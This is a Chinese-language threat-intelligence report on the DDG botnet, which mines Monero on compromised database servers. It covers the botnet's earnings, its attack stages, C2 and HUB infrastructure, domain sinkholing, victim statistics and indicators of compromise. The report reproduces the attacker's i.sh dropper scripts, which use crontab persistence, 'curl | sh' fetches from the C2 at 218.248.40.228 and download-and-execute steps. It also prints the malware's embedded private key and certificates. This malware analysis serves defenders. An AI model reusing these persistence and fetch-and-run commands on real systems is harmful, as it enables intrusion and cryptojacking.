> 原文链接: https://www.anquanke.com//post/id/97300 


# DDG.Mining.Botnet：一个瞄准数据库服务器的挖矿僵尸网络


                                阅读量   
                                **236181**
                            
                        |
                        
                                                                                    



[![](https://p0.ssl.qhimg.com/t018e7c2f5d53bbab1d.jpg)](https://p0.ssl.qhimg.com/t018e7c2f5d53bbab1d.jpg)

从 2017-10-25 开始，我们监控到有恶意代码在大规模扫描互联网上的 OrientDB 数据库服务器。进一步的分析发现，这是一个长期运营的僵尸网络，其主要目标是挖取门罗币（XMR，Monero CryptoCurrency）。我们将其命名为 **DDG 挖矿僵尸网络** （DDG Mining Botnet，以下简称 DDG） ，主要原因是因为其核心功能模块的名称为 DDG。

DDG 累积挖取的门罗币数目较大。目前我们能够确认该僵尸网络累积挖取的已经超过 **3,395枚门罗币**，按当前价格折合**人民币 ￥5,821,657** 。另外因为矿池记账系统的问题，有2,428枚 XMR不能完全确认是否归属 DDG，按当前价格折合人民币 ￥4,163,179。DDG 是目前我们视野范围内门罗币收益第二大的僵尸网络，第一大的是我们之前报告的 [MyKings](http://blog.netlab.360.com/mykings-the-botnet-behind-multiple-active-spreading-botnets/) 僵尸网络。

DDG 的结构上，除了僵尸网络中常见的 C2 和 bot，还有一个很有意思的 HUB 的设定。HUB 是一组 IP或者域名，用来提供挖矿二进制程序的下载。在 DDG 持续的更新过程中，其 v2011 版本的 HUB 列表中，有两个域名被列出但是未被注册，我们抢先注册并Sinkhole了这两个域名。虽然我们不可以通过这两个域名 Sinkhole 来接管该僵尸网络，但是可以基于 Sinkhole 数据对整个 DDG 僵尸网络的规模做一个精确的度量。



## DDG Mining Botnet 的挖矿收益

DDG 在挖矿时使用如下矿池地址：
- [https://monero.crypto-pool.fr/](https://monero.crypto-pool.fr/)
其使用的钱包地址有三个，如下：
<li>
**Wallet #1**4AxgKJtp8TTN9Ab9JLnvg7BxZ7Hnw4hxigg35LrDVXbKdUxmcsXPEKU3SEUQxeSFV3bo2zCD7AiCzP2kQ6VHouK3KwnTKYg</li>
<li>
**Wallet #2**45XyPEnJ6c2STDwe8GXYqZTccoHmscoNSDiTisvzzekwDSXyahCUmh19Mh2ewv1XDk3xPj3mN2CoDRjd3vLi1hrz6imWBR1</li>
<li>
**Wallet #3**44iuYecTjbVZ1QNwjWfJSZFCKMdceTEP5BBNp4qP35c53Uohu1G7tDmShX1TSmgeJr2e9mCw2q1oHHTC2boHfjkJMzdxumM</li>
其中，Wallet #3 是最先开始活跃的钱包地址，高峰期在 2017.02～2017-03；随后是 Wallet #1，持续了2017一整年； Wallet #2 是最近出现的，我们首次观察到的时间是 2018-01-03。

全部三个钱包的收入如下表所示，共计收入 3395 或者 5760 的门罗币，这些代币今天价值人民币 **580万** 或者 **980万**。注意：在第二个钱包付费记录中，”Total Paid”与逐笔交易累积得到的 “Amount Summary” 并不一致，我们无从确认哪个数字更准确，因此把两个数字都记录了下来。

[![](https://p3.ssl.qhimg.com/t013521c28412de8e6f.png)](https://p3.ssl.qhimg.com/t013521c28412de8e6f.png)

## DDG Mining Botnet 的攻击阶段和结构划分

通过分析样本及其行为，我们能够描绘 DDG Mining Botnet 的攻击过程如下：

[![](https://p2.ssl.qhimg.com/t016d4365a9d535f681.png)](https://p2.ssl.qhimg.com/t016d4365a9d535f681.png)

上图中，DDG Mining Botnet 的攻击过程可以分为几个阶段：
<li>
**扫描阶段**：攻击者（ ss2480.2 ）利用 OrientDB 数据库的已知 RCE 漏洞，投入攻击载荷；</li>
<li>
**第一阶段**：攻击者修改本地 Crontab 定时任务，下载执行主要服务器上的 i.sh ( hxxp://218.248.40.228:8443/i.sh) ，并保持每 5 分钟同步。此 i.sh 会继续从同一服务器上下载运行 ddg 样本</li>
<li>
**第二阶段**：ddg 会依次连接内置 **hub_iplist.txt** 文件里的 hub_ip，然后从可以成功连接的 hub_ip 上下载对应的 Miner 程序 wnTKYg（如果本机 CPU 不支持 AES-NI，还会下载 wnTKYg.noaes）。这个程序的命名，恰好是其钱包地址的尾部。</li>
<li>
**挖矿阶段**：Miner 程序开始与矿池通信，利用失陷主机的计算资源，为攻击者的钱包开始挖矿。</li>
上述结构中，除了僵尸网络中常见的 C2 和 bot 以外，还有一个很有意思的 **HUB**。攻击者使用 HUB 上的多个IP或者域名来提供挖矿程序的下载。我们观察到 DDG 运营者会不时更新这些 HUB 的IP和域名，来源大部分是失陷主机。全部的 HUB 列表见文末。

关于这个 **HUB** 另一个有意思的地方，是我们注意到 v2011 版本中三个域名中的两个在当时是未注册的，如下。这两个域名被我们注册并 Sinkhole，后来我们意识到，我们可以通过这两个 HUB Sinkhole 上的到的数据来精确度量整个 DDG 僵尸挖矿网络。
- defaultnotepad567[.]com
- unains1748[.]com 未注册
- 5dba35bsmrd[.]com 未注册
下面我们分别介绍 DDG 僵尸网络的 C2， HUB， 和 Bot。其中 Bot 部分的数据，会使用来自Sinkhole 的数据。



## DDG 僵尸网络的 C2

DDG 僵尸网络使用如下 C2 保持对设备的长期控制：
- 202.181.169.98:8443/i.sh
- 218.248.40.228:8443/i.sh
其中后者来自印度，AS9829，一直在使用，两年来没有变过；前者来自香港，AS7540，仅在早期短暂使用。

#### DDG 僵尸网络的 HUB，以及我们的 HUB Sinkhole

DDG 僵尸网络使用 **HUB_IP:8443\wnTKYg** 提供挖矿程序下载。我们监控到的两个版本的 HUB 详细列表见文末 IoC 部分，其国家分布如下表所示。可见大部分受害者位于中国。

[![](https://p5.ssl.qhimg.com/t01e3bda7160b4ca8ad.png)](https://p5.ssl.qhimg.com/t01e3bda7160b4ca8ad.png)

如前所述，我们在监控其 v2011 版本的时候，发现其中两个域名没有注册，unains1748[.]com 和 5dba35bsmrd[.]com 。我们注册了这两个域名，合并到我们的 Sinkhole 池中，并几乎立刻看到有 IP 开始连接这两个域名，后来我们确认来连接的这些 IP 均是被 DDG 感染的主机。

这样至少我们可以利用 HUB Sinkhole 来度量 DDG 的规模。那么，我们的 Sinkhole 能看到 DDG 僵尸网络的多大部分呢，是盲人摸象看到一部分？还是全部？

我们仔细检查了 DDG 的运行机制，并且确认无论被感染的 bot 最终从 HUB 上的哪个部分下载挖矿程序，这些 bot 都会检查 HUB 上的全部 IP 和域名的连通性。这意味着，我们可以 **看到 DDG 全部的被感染设备**，并进一步利用这些数据对 DDG 僵尸网络做精确的度量。

可惜的是，我们注册 Sinkhole 的行动被 DDG 运营者发现了，他们随后发布了 DDG 的更新版本，更新了全部的 HUB IP列表，将我们的 Sinkhole 从僵尸网络内部踢了出来。

另外一方面，从 bot 的代码逻辑来看，创造合适的条件，会使得被感染的 bot 尝试从我们的 sinkhole 下载并运行挖矿程序….嗯，这个话题我们就讨论到这里，白帽子一定要带头做遵纪守法的好公民。



## DDG 僵尸网络的 Bot

我们可以使用 HUB Sinkhole 的数据来精确度量 DDG 僵尸网络的感染规模。为避免滥用，全部受害者 IP 列表不会公开。

我们共记录了4391 个受害者IP地址，来自各个国家，最主要的受害者集中在中国(73%)和美国(11%)：

[![](https://p0.ssl.qhimg.com/t0101dc178179e2c61d.png)](https://p0.ssl.qhimg.com/t0101dc178179e2c61d.png)

从网络自治域分布来看，国内各主要云计算服务商均有出现，国外若干互联网巨头公司也有少量中招。总体来看，因为 DDG 投入时是利用数据库服务器的错误配置或者漏洞利用，云服务厂商既往确实不容易防范。建议后续云服务厂商考虑加强这方面的防御措施。

[![](https://p1.ssl.qhimg.com/t01b92a2f49913c3ca6.png)](https://p1.ssl.qhimg.com/t01b92a2f49913c3ca6.png)

受害者一段时间内对上述 2 个域名的 DNS 请求趋势如下。尾部曲线快速下降，对应僵尸网络运营者更新版本的时段。

[![](https://p3.ssl.qhimg.com/t01a6cd713c2b2806ef.png)](https://p3.ssl.qhimg.com/t01a6cd713c2b2806ef.png)



## 利用 DNSMon 感知这三个域名的异常访问

我们的 DNSMon 也感知到了这三个域名的异常，下面两张图分别展示这三个域名流量访问曲线高度拟合，并且在访问时序上有强烈的相关性：

[![](https://p2.ssl.qhimg.com/t01e6e5abf9b52bea27.png)](https://p2.ssl.qhimg.com/t01e6e5abf9b52bea27.png)

[![](https://p2.ssl.qhimg.com/t018ac50a709b440e7b.png)](https://p2.ssl.qhimg.com/t018ac50a709b440e7b.png)



## DDG Mining Botnet 攻击过程详细剖析

### 扫描

DDG Mining Botnet 的扫描和入侵阶段由样本 ss2480.2 完成。ss2408.2 首先会根据一定策略生成 Target IP 并扫描 Target IP 的 2480 端口，最后会利用 OrientDB 的 RCE 漏洞 [CVE-2017-11467](https://blogs.securiteam.com/index.php/archives/3318) 实施入侵。

ss2480.2 会先扫描内网网段，然后扫描公网网段。生成的内网网段 Target IP 范围如下：
- 10.Y.x.x/16 (Y 为当前内网 IP B 段的值)
- 172.16.x.x/16
- 192.168.x.x/16
样本中生成内网 Target IP 的部分代码如下：

[![](https://p1.ssl.qhimg.com/t01fa19aaee36c690d2.png)](https://p1.ssl.qhimg.com/t01fa19aaee36c690d2.png)

结束对内网的扫描之后，ss2480.2 会访问 hxxp://v4.ident.me 获取当前主机的公网 IP 地址 **WAN_IP** ，然后在 `WAN_IP/8` 范围内生成公网 Target IP 发起扫描。样本中生成公网 Target IP 时，会过滤掉保留地址段：

[![](https://p1.ssl.qhimg.com/t014e55061ecb36d082.png)](https://p1.ssl.qhimg.com/t014e55061ecb36d082.png)

ss2480.2 利用 OrientDB 漏洞的过程如下：<br>[![](https://p3.ssl.qhimg.com/t014684fbe8d8987e79.png)](https://p3.ssl.qhimg.com/t014684fbe8d8987e79.png)

样本利用漏洞最后执行的 Payload 如下：[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01096a7d44ee39c052.png)

### 第一阶段

DDG 在 C2 （218.248.40.228 India/IN AS9829）上提供了云端配置文件： hxxp://218.248.40.228:8443/i.sh

该 i.sh 配置文件有多次变化，但是内容大同小异。下面是一个早期版本，其功能主要是：
- 将本地 Crontab 内容与远程服务器上的 i.sh 保持同步
- 从远程服务器下载 ddg 样本到本地并执行
- 检查本地的 ddg 的历史版本进程，并杀掉
```
export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin

echo "*/5 * * * * curl -fsSL http://218.248.40.228:8443/i.sh?6 | sh" &gt; /var/spool/cron/root  
mkdir -p /var/spool/cron/crontabs  
echo "*/5 * * * * curl -fsSL http://218.248.40.228:8443/i.sh?6 | sh" &gt; /var/spool/cron/crontabs/root

if [ ! -f "/tmp/ddg.2011" ]; then  
    curl -fsSL http://218.248.40.228:8443/2011/ddg.$(uname -m) -o /tmp/ddg.2011
fi  
chmod +x /tmp/ddg.2011 &amp;&amp; /tmp/ddg.2011


#if [ ! -f "/tmp/ss2480.2" ]; then
    #curl -fsSL http://218.248.40.228:8443/ss2480.2 -o /tmp/ss2480.2
#fi
#chmod +x /tmp/ss2480.2 &amp;&amp; /tmp/ss2480.2

ps auxf | grep -v grep | grep ss2480.1 | awk '`{`print $2`}`' | kill  
#ps auxf | grep -v grep | grep ss22522.1 | awk '`{`print $2`}`' | kill
#ps auxf | grep -v grep | grep ss22522.2 | awk '`{`print $2`}`' | kill
#ps auxf | grep -v grep | grep ddg.1010 | awk '`{`print $2`}`' | kill
#ps auxf | grep -v grep | grep ddg.1021 | awk '`{`print $2`}`' | kill
#ps auxf | grep -v grep | grep ddg.2001 | awk '`{`print $2`}`' | kill
#ps auxf | grep -v grep | grep ddg.2003 | awk '`{`print $2`}`' | kill
#ps auxf | grep -v grep | grep ddg.2004 | awk '`{`print $2`}`' | kill
#ps auxf | grep -v grep | grep ddg.2005 | awk '`{`print $2`}`' | kill
#ps auxf | grep -v grep | grep ddg.2006 | awk '`{`print $2`}`' | kill
#ps auxf | grep -v grep | grep ddg.2010 | awk '`{`print $2`}`' | kill

#ps auxf | grep -v grep | grep ddg.2011 || rm -rf /tmp/ddg.2011
```

由 i.sh 脚本内容可知，攻击者只需更新其中的样本下载地址，便可以灵活地向失陷主机投放任意恶意软件。根据我们的监控，该云端配置文件确实会不定时更新，用以投放新版木马文件，或者投放集成新的攻击方式的恶意软件。其投递的恶意软件包括：
<li>
**DDG 样本**：即 ddg.$(uname -m) 系列样本，这是长期投递的攻击载荷，我们监测到 v2011、v2020 和 v2021 共 3 个大版本</li>
<li>
**ss22522** 系列样本：短时间内投递过，针对Struts2 漏洞 S2-052</li>
<li>
**ss2480** 系列：短时间内投递过，是针对 OrientDB 漏洞的攻击样本，正是这个样本在短时间内的大规模扫描暴露了自己</li>
另外，早期版本中 kill 命令前面没有 xargs，进程并不会真正被杀死，在后期版本上这个 xargs 被加了进去，修复了这个问题。

2018.1.3 日，攻击者上线了最新的 i.sh(v2021.2)，新增了另外一个挖矿木马 **imWBR1**，正是该木马中内置了前文列出的第二个 XMR 钱包地址 :

```
export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin

echo "*/5 * * * * curl -fsSL http://218.248.40.228:8443/i.sh | sh" &gt; /var/spool/cron/root  
echo "*/5 * * * * wget -q -O- http://218.248.40.228:8443/i.sh | sh" &gt;&gt; /var/spool/cron/root  
mkdir -p /var/spool/cron/crontabs  
echo "*/5 * * * * curl -fsSL http://218.248.40.228:8443/i.sh | sh" &gt; /var/spool/cron/crontabs/root  
echo "*/5 * * * * wget -q -O- http://218.248.40.228:8443/i.sh | sh" &gt;&gt; /var/spool/cron/crontabs/root

if [ ! -f "/tmp/ddg.2021" ]; then  
    curl -fsSL http://218.248.40.228:8443/2021/ddg.$(uname -m) -o /tmp/ddg.2021
fi

if [ ! -f "/tmp/ddg.2021" ]; then  
    wget -q http://218.248.40.228:8443/2021/ddg.$(uname -m) -O /tmp/ddg.2021
fi

chmod +x /tmp/ddg.2021 &amp;&amp; /tmp/ddg.2021


if [ ! -f "/tmp/imWBR1" ]; then  
    curl -fsSL http://218.248.40.228:8443/imWBR1 -o /tmp/imWBR1 --compressed
fi

ps auxf | grep -v grep | grep Circle_MI | awk '`{`print $2`}`' | xargs kill  
ps auxf | grep -v grep | grep get.bi-chi.com | awk '`{`print $2`}`' | xargs kill  
ps auxf | grep -v grep | grep hashvault.pro | awk '`{`print $2`}`' | xargs kill  
ps auxf | grep -v grep | grep nanopool.org | awk '`{`print $2`}`' | xargs kill  
ps auxf | grep -v grep | grep minexmr.com | awk '`{`print $2`}`' | xargs kill  
ps auxf | grep -v grep | grep /boot/efi/ | awk '`{`print $2`}`' | xargs kill  
#ps auxf | grep -v grep | grep ddg.2006 | awk '`{`print $2`}`' | kill
#ps auxf | grep -v grep | grep ddg.2010 | awk '`{`print $2`}`' | kill
```

### 第二阶段

ddg 样本中内置了一个 **hub_iplist.txt** 文件，其中包含了上百个 `hub_ip:8443` 的列表。经我们排查，这些 hub_ip 对应的主机，多是常规网站服务器，都被攻击者入侵而沦为攻击者的肉鸡。

在这个阶段，ddg 会依次尝试连接 hub_iplist.txt 里的 hub_ip，如果成功连接某个 hub_ip ，ddg 就会访问 `http://&lt;hub_ip&gt;:8443/wnTKYg` 下载对应的 Miner 程序 wnTKYg 并启动（如果本机 CPU 不支持 **AES-NI**，还会下载 **wnTKYg.noaes**）。ddg 尝试连接 hub_ip 的过程抓包如下：

[![](https://p0.ssl.qhimg.com/t01a97770095e69fbf4.png)](https://p0.ssl.qhimg.com/t01a97770095e69fbf4.png)

ddg.xxx 与 ss2480.xxx 样本均由 Golang 编写而成。ddg 与 hub_ip 通信，通过一个 Golang 第三方 Stream Multiplexing 库 [Smux](https://github.com/xtaci/smux) 完成。ddg 用了 Smux 的默认配置：<br>[![](https://p3.ssl.qhimg.com/t0172fe58aab9f81c39.png)](https://p3.ssl.qhimg.com/t0172fe58aab9f81c39.png)

所以在 ddg 从 hub_ip 下载 Miner 并启动后的 [KeepAlive](https://github.com/xtaci/smux/blob/ebec7ef2574b42a7088cd7751176483e0a27d458/session.go#L284) 阶段，就会每隔 10s 向已连接的 hub_ip 发 2 个数据包：

[![](https://p3.ssl.qhimg.com/t018661aebbf14140c1.png)](https://p3.ssl.qhimg.com/t018661aebbf14140c1.png)



## 样本中内置的 hub_iplist.txt

i.sh 文件中的 ddg 样本下载 URL 是 `hxxp://218.248.40.228:8443/2011/ddg.$(uname -m)`。ddg 文件V2011内置的 hub_iplist.txt 中有 158 个 hub_ip:8443 和 3 个 hub_domain:8443 列表，其中 2 个 Domain 未注册，然后被我们注册并 Sinkhole。

2017-11-10 我们发现 i.sh 文件内容有变化，ddg 样本最新的下载链接变成了 `hxxp://218.248.40.228:8443/2020/ddg.$(uname -m)` 。我们排查后发现是 ddg 内置的<br>
hub_iplist.txt 内容有变化，估计是之前我们 Sinkhole 了黑客未注册的域名被他们发觉，他们重新上线了一批 hub_ip，替换掉了全部的 hub_ip。



## DDG Mining Botnet 的攻击目标，还曾瞄准 Redis 数据库与 SSH 服务

以上分析中，DDG 的攻击目标集中在 OrientDB 上。

事实上，ddg 木马中的 `ddg.$(uname -m)` 系列样本还可以对 SSH 服务和 Redis 服务发起扫描&amp;暴破攻击，这也是 ddg 一直以来入侵用户主机的主要手段。样本中内置的部分相关函数以及暴破字典如下两图所示：

[![](https://p3.ssl.qhimg.com/t011821267190950b99.png)](https://p3.ssl.qhimg.com/t011821267190950b99.png)[![](https://p0.ssl.qhimg.com/t014642aa26ddffcf3e.png)](https://p0.ssl.qhimg.com/t014642aa26ddffcf3e.png)

样本中还有内置的 3 个 x509 证书 / 密钥文件如下：
- slave.pem
- ca.pem
- slave.key
详细内容见文末 IoC 部分。

回溯历史数据时，我们还能看到 i.sh 的 host 218.248.40.228 在更早期扫描 Redis 数据库的痕迹。互联网上也偶尔会有受害者曝光自己服务器中了 ddg 木马被用来挖矿。 下表是 218.248.40.228 在 2017-09-27 20:00:00 ~ 2017-10-25 11:00:00 期间扫描端口的分布情况。

按照扫描次数排序，6379, 7379，2480, 三个端口分别 Redis, Redis(Replicas), OrientDB 数据库服务：

[![](https://p2.ssl.qhimg.com/t014f5a0eef2e749af1.png)](https://p2.ssl.qhimg.com/t014f5a0eef2e749af1.png)

### 

## 近况

北京时间 2018.1.25 日 21 点左右，`hxxp://218.248.40.228:8443/2011/ddg.x86_64` 的样本更新，MD5 为 **cbc4ba55c5ac0a12150f70585af396dc**，是一个 Mirai 家族的样本。

Mirai C2 为 `linuxuclib.com:8080` 。

另外一个硬编码明文 C2 `jbeupq84v7.2y.net` 目前在在DNS系统中没有配置解析IP地址。



## IoC

C2:

```
202.181.169.98:8443  
218.248.40.228:8443  
linuxuclib.com:8080  
jbeupq84v7.2y.net
```

样本 MD5:

```
b1201bf62f3ca42c87515778f70fd789    ddg.i686   --&gt; v2011  
7705b32ac794839852844bb99d494797    ddg.x86_64 --&gt; v2011  
1970269321e3d30d6b130af390f2ea5c    ddg.i686   --&gt; v2020  
5751440a2b3ce1481cf1464c8ac37cbe    ddg.x86_64 --&gt; v2020  
f52f771c5b40a60ce344d39298866203    ddg.i686   --&gt; v2021  
3ea75a85bab6493db39b1f65940cc438    ddg.x86_64 --&gt; v2021  
b0c6cefa1a339437c75c6b09cefeb2e8    ss2480.1  
8c31b6379c1c37cf747fa19b63dd84a1    ss2480.2  
4fc28b8727da0bcd083a7ac3f70933fa    ss22522.2  
d3b1700a413924743caab1460129396b    wnTKYg  
8eaf1f18c006e6ecacfb1adb0ef7faee    wnTKYg.noaes  
9ebf7fc39efe7c553989d54965ebb468    imWBR1
```

样本下载链接：

```
hxxp://218.248.40.228:8443/2011/ddg.i686  
hxxp://218.248.40.228:8443/2011/ddg.x86_64  
hxxp://218.248.40.228:8443/2020/ddg.i686  
hxxp://218.248.40.228:8443/2020/ddg.x86_64  
hxxp://218.248.40.228:8443/2021/ddg.i686  
hxxp://218.248.40.228:8443/2021/ddg.x86_64  
hxxp://218.248.40.228:8443/i.sh  
hxxp://218.248.40.228:8443/ss22522.2  
hxxp://218.248.40.228:8443/ss2480.1  
hxxp://218.248.40.228:8443/ss2480.2  
hxxp://218.248.40.228:8443/wnTKYg  
hxxp://202.181.169.98:8443/2011/ddg.i686  
hxxp://202.181.169.98:8443/2011/ddg.x86_64  
hxxp://202.181.169.98:8443/i.sh  
hxxp://202.181.169.98:8443/ss22522.2  
hxxp://202.181.169.98:8443/ss2480.1  
hxxp://202.181.169.98:8443/ss2480.2  
hxxp://202.181.169.98:8443/wnTKYg  
hxxp://218.248.40.228:8443/imWBR1  
```

ip_hublist(v2011): [ip_hublist__2011.txt](http://blog.netlab.360.com/file/ip_hublist__2011.txt)

ip_hublist(v2020~v2021): [ip_hublist__2020.txt](http://blog.netlab.360.com/file/ip_hublist__2020.txt)

三个 x509 证书/密钥文件：

slave.pem

```
-----BEGIN CERTIFICATE-----
MIICozCCAYsCCQDFoT3X3cNwiDANBgkqhkiG9w0BAQsFADATMREwDwYDVQQDDAh3  
ZS1hcy1jYTAeFw0xNzA3MTcwMTM2MjhaFw0yNzA3MTUwMTM2MjhaMBQxEjAQBgNV  
BAMMCWxvY2FsaG9zdDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAN1w  
9s7u1BrQSxJEkqCkJLl+qnw4XPL+GgCimso6WWvie8gr3AFiSDUFMVsbOOlGVXJD  
CAaYStw6Wkn09cjAczNW9Ysq4EOurpGmCDdViftu+5zu2Zmz88p1/ta3BuytQlfE  
Qll6IFjNLSPOAaIwaWcQFXN/OlCPJZ7wvdo5aXFgVkvFplXogQiFLdKn3PgtDiNy  
EZct1/GgkYkgMTiymGrhXyj6/Eca28IsTydwU5h2fkkAIwnYpyeeEdcxsLmmFmfE  
G5x1mNsmUPnvMU7/qULmchVJ16pne06rNREApbuhm/XrhaDjphK8CNbUDWNXCWIR  
SKUl5bMoq5XnrvKc98kCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAg/G9vqIRz4rC  
niH49gSwFzBhH9tCXyBtHj86WMb2hi9myzFGE4joMhWp7OK3lwWq18kbukPk0TBz  
N9Mxrvvr0REBMPa1Q7VAq5ouFHw4WcIyzi1Ksw0SmFjaRCGqJTWQnG8lz+aIN8NX  
/i1KBWPbrnZGFfLdcKUmKrIXt6I3S1kb3jhJvlTOTjfr/iPlAMjVE9+tdgmy0Bsh
Mon9ctFwFj0sLhkcuyXU33ItkX5am2qmG7ToCoUj855JEm06T6PSakRLvodAsZfp  
Jmto1aFjT/7HS5ImcOrd1WWXU76cSZN5GENRcsIzmA3pq6dVKFfSwsAOMw5zQcTS  
uDpcOCRjJg==  
-----END CERTIFICATE-----
```

ca.pem

```
-----BEGIN CERTIFICATE-----
MIIC/DCCAeSgAwIBAgIJAK1DRcYUFowVMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV  
BAMMCHdlLWFzLWNhMB4XDTE3MDcxNzAxMzYyOFoXDTQ0MTIwMjAxMzYyOFowEzER  
MA8GA1UEAwwId2UtYXMtY2EwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB  
AQCz6Iaprhnb68CEPCJzU1uCplIMQWuMtpuamV/M4T1G0A0qPHLsCPbnS+psuSwK  
Tnp3XBDEdTbhm33/FfLXeEfEmJlVX4lJfPk7XPT/UwgJ1OgGVegxNndPd+FQf1oX  
5ePSEmGZQRy9gkRQtCpSmO11AO8bbZY+WhHzvb3VQmu6rBAVCnzhPmBBlXsoyJfI  
oRVX5FEwCMZXuKHVd2N/Q8XBEFX6TGICEAwSCu69QYG7eFMleLgCxFRJ1xOXfPvD  
x++depGUDpR9PrsTQ6Oh3BIicuWHfj72tiooVW1mGG8yAqDfb1kBa5gq8jZM13Nx  
gK0aRbZiJFreFj8Ed05LlPdnAgMBAAGjUzBRMB0GA1UdDgQWBBRL9zCbPXsgyxFe  
oZYZtZmjvAyqbDAfBgNVHSMEGDAWgBRL9zCbPXsgyxFeoZYZtZmjvAyqbDAPBgNV  
HRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBFne95zt54uyUn2ZtdUUHH  
Oh3ODsCx+hL4DWsyaVa1l9PTW1es58+VGPFr4JYKj5DDj1FebYW/k0DAt6G4ehVg  
pfYW23lYbwfbs1gFKaUVX1gb0U0BsLlXGJ5dVlnY09Z3RGZ1nf0U6VgTbleDc/M6  
Cax7dvyn2a+2BJLxl3QCUVye6PJw33Hjjl8xfMTEv3RKoxeYP0Prgrmmg/gmr7hs  
doWJBMflCWmwZJKhtdYAKMkFnprNH4h8ryqsWeO928ZHbHbxej15Rv9BjXIg4XnF  
tEIvhZUJ3tj4OvK8X6hJf0ZsI/3H1ffvTHyIX4UnYgGqMFlHSBXMhOIiXed6+xsP  
-----END CERTIFICATE-----
```

slave.key

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA3XD2zu7UGtBLEkSSoKQkuX6qfDhc8v4aAKKayjpZa+J7yCvc  
AWJINQUxWxs46UZVckMIBphK3DpaSfT1yMBzM1b1iyrgQ66ukaYIN1WJ+277nO7Z  
mbPzynX+1rcG7K1CV8RCWXogWM0tI84BojBpZxAVc386UI8lnvC92jlpcWBWS8Wm  
VeiBCIUt0qfc+C0OI3IRly3X8aCRiSAxOLKYauFfKPr8RxrbwixPJ3BTmHZ+SQAj  
CdinJ54R1zGwuaYWZ8QbnHWY2yZQ+e8xTv+pQuZyFUnXqmd7Tqs1EQClu6Gb9euF  
oOOmErwI1tQNY1cJYhFIpSXlsyirleeu8pz3yQIDAQABAoIBAQCTltbo1QVJWcqv  
QkT4DG7tsx6t7GMHEZUDF11Tq9Att6YIpDLeOUMnE27x6hLkZ5xLq6GNw7MhVUMY  
R8wJITum3C6LsugGNEbljGOtfbWZfz70Ob2OVAIIztwq/5H97PxqwsP2Hw+wIBAV  
7RfpoZqetnmVoRac2suYQ5xF9j3w8acpCZdU2jCvbMNADdOtCkXBXcD9nGU0d9dN  
Z+qajp7otDw1DbQ381x6YDEu0g9CJhXdVfqK0skOs9KTrATxLBw4u6UmIP7fNAoH  
p9OXzp6gzzl4mLR05SWm1pcjuoqxL88wIPYtcfKo8Z4CxZhx2oPTiQ0JUiVHUvPh  
OZwu2GSBAoGBAPFscPODr2H4dFFKK6uYb2ZRY6WSOiL31o1LCZ3a4lDJS7fvncZK  
OiyG/RQIt0k68UQHNxte0VOHiaGqCaHlfikS/KN5WyQeaRmH+MKxp+atGvKXmURV  
+uWK37GCIDzqTDPtu9UiAxQOOJQZCvGh40lc35v2aJGKpkD4+IaEDpDXAoGBAOrP
qpei2+DtwougNA9FTxS3Z34NCCIHT0rqoogZZirMy6M7LnUoWAgMIUjpENK7uxma  
nNEWagv5XrLmFbjC/UaTF5BR9CrX0orto2CNA2upN+7Y6wNnB1ed7sjLubDEPNXv  
JeZsoz4G7TDq9oXE54a8idFVePn8q1RdRvHOdYhfAoGAbMgqFO+vJPvonYBIMSec  
eoQN3FsJKxx1ZnD7Qk+QTkqFfbnQY7qqf8nLWy2aOLsAX2DI6eJNe8/Eqj2N3Y8k  
y6ksgRR7hsjVHpXv9vpJ51z0mX7Jpsr/JFLw/HDfydLgxz1Ft4F91Zma0NB/5+TE  
HxhkAUiEUaAhzYDhquryDT0CgYAP0YOdiYQkh//mJhm7uaCVNbHMJRaaLEHkOyBN  
6OAgHAHP8kmz7M7ZY+/OGJ1ghPMay3arA0aLnfYKOUPXWZN0cK5Ss6KuTDHL2Cx8  
caN8Wj8BYS2b4hH1jhcrAcZ1qRKsGttDxafNouvRstJ+uoAabJMgPhDTTnlASrRf  
z9fNIwKBgCM3UzxVsRyoYx7rpCQ7QSX6SHsM0cNjWDRw5aMziQmyI+sitwOPAVek  
O+XvIXIzdahNBhQQ0giFKWh/b7fq2aNB1J+5TtAcEFTFFk9LC3l/U7Mk0nhUsh6G  
pEcsRlnc4GpFeelJtj/c1BHBbX7HSdB8osk3GDyUwX1KVlbxZ4dk  
-----END RSA PRIVATE KEY-----
```
